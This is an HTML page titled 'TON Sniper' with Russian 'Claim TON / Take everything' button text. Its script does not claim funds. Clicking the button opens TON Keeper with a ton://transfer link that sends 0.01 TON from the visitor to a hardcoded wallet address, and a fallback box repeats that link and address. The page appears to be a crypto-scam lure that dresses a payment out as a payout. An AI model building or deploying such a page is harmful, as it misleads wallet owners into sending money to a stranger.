<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Sniper</title>
    <style>
        body {
            background: #0d0d0d;
            color: #fff;
            font-family: Arial;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 15px;
        }
        .container {
            background: #1a1a1a;
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        h2 {
            color: #00d4ff;
            font-size: 24px;
        }
        .wallet {
            background: #111;
            padding: 12px;
            border-radius: 10px;
            margin: 10px 0;
            border: 1px solid #2a2a2a;
            word-break: break-all;
            font-size: 13px;
        }
        .big-btn {
            background: linear-gradient(135deg, #ff3300, #cc0000);
            border: none;
            color: #fff;
            font-size: 20px;
            font-weight: bold;
            padding: 18px;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.4);
        }
        .big-btn:hover {
            transform: scale(1.02);
        }
        #status {
            background: #111;
            padding: 15px;
            border-radius: 10px;
            margin-top: 15px;
            border: 1px solid #2a2a2a;
            font-size: 13px;
        }
        .link-box {
            background: #0a0a0a;
            padding: 12px;
            border-radius: 10px;
            margin: 10px 0;
            border: 1px solid #00d4ff;
            word-break: break-all;
            font-size: 12px;
            color: #00d4ff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>⚡ ЗАБРАТЬ TON</h2>
        
        <div class="wallet">
            👤 Адрес получателя:<br>
            <b style="color:#00d4ff;font-size:12px;">UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P</b>
        </div>
        
        <button class="big-btn" id="snipeBtn">🔥 ЗАБРАТЬ ВСЁ</button>
        
        <div id="status">Нажми кнопку → откроется TON Keeper</div>
    </div>

    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
        const status = document.getElementById('status');
        const btn = document.getElementById('snipeBtn');

        btn.onclick = function() {
            status.innerHTML = '⏳ Открываю TON Keeper...';
            
            // Самая простая хуйня - просто ссылка на перевод
            const url = `ton://transfer?address=${TARGET}&amount=0.01`;
            
            // Пробуем открыть
            window.location.href = url;
            
            setTimeout(() => {
                window.open(url, '_blank');
            }, 300);
            
            status.innerHTML = `
                ✅ Если TON Keeper не открылся:<br><br>
                <div class="link-box">
                    👆 Нажми и удерживай эту ссылку<br>
                    <b style="font-size:14px;color:#fff;">${url}</b>
                </div>
                <br>
                Или открой TON Keeper вручную и вставь адрес:<br>
                <b style="color:#00d4ff;font-size:11px;">${TARGET}</b>
            `;
        };
    </script>
</body>
</html>
